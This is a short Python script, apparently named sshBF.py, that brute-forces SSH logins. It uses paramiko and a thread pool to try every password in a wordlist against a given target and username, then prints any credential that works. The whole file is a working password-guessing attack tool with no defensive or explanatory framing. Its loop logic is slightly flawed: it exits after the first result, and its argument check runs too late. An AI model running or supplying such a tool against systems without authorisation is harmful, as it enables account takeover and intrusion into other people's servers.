import paramiko
import sys
import concurrent.futures
import time

target = sys.argv[1]
username = str(input('Please enter username to bruteforce: '))
password_file = sys.argv[2]

if len(sys.argv) < 3:
    print("Usage: python3 sshBF.py <targetIP> <wordlist>")

def ssh_connect(password, code=0):
    #time.sleep(0.3)                                         # Delay
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        print("\t FOUND PASSWORD: ", password)
    except paramiko.AuthenticationException:
        code = 1
        print("Incorrect: ", password)
    ssh.close()
    return code

print("[*] Loading passwords...")
passwords = []
with open(password_file, 'r') as file:
    lines = file.readlines()
    for line in lines:
        passwords.append(line.strip())

print("[*] Initiating SSH Brute Forcing...")
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:                  # Too fast will cause the server will force close
    futures = [executor.submit(ssh_connect, password) for password in passwords]
    for future in concurrent.futures.as_completed(futures):
        response = future.result()
        if response == 1:
            pass
        else:
            print("PASSWORD FOUND!")
            break
        exit(0)